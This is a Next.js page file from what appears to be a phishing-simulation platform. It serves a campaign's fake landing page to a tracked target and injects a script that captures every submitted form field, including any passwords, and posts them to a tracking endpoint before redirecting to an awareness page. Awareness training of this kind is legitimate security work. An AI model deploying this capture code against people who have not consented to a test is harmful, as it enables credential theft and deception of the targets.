import { createClient } from '@supabase/supabase-js'
import { notFound } from 'next/navigation'

// This page renders the phishing landing page for a specific target
// No auth required - this is what the target sees when they click the phishing link

export default async function PhishingLandingPage({
  params,
}: {
  params: { token: string }
}) {
  const supabase = createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.SUPABASE_SERVICE_ROLE_KEY!
  )

  // Look up the campaign target and get the landing page
  const { data: ct } = await supabase
    .from('campaign_targets')
    .select('id, campaign_id, campaigns(landing_page_id, landing_pages(*))')
    .eq('tracking_token', params.token)
    .single()

  if (!ct) return notFound()

  const campaign = (ct as any).campaigns
  const landingPage = campaign?.landing_pages

  if (!landingPage) return notFound()

  // Inject the form submission handler into the HTML
  const appUrl = process.env.NEXT_PUBLIC_APP_URL || 'http://localhost:3000'
  const submitUrl = `${appUrl}/api/tracking/${params.token}/submit`
  const awarenessUrl = `${appUrl}/phish/awareness`

  // Modify the landing page HTML to intercept form submissions
  let html = landingPage.html_content

  // Inject a script that intercepts form submissions and sends data to our tracking endpoint
  const interceptScript = `
<script>
document.addEventListener('DOMContentLoaded', function() {
  var forms = document.querySelectorAll('form');
  forms.forEach(function(form) {
    form.addEventListener('submit', function(e) {
      e.preventDefault();
      var formData = new FormData(form);
      var data = {};
      formData.forEach(function(value, key) { data[key] = value; });

      fetch('${submitUrl}', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      }).then(function() {
        window.location.href = '${awarenessUrl}';
      }).catch(function() {
        window.location.href = '${awarenessUrl}';
      });
    });
  });
});
</script>`

  // Insert before </body> or at end
  if (html.includes('</body>')) {
    html = html.replace('</body>', interceptScript + '</body>')
  } else {
    html += interceptScript
  }

  return (
    <div dangerouslySetInnerHTML={{ __html: html }} />
  )
}
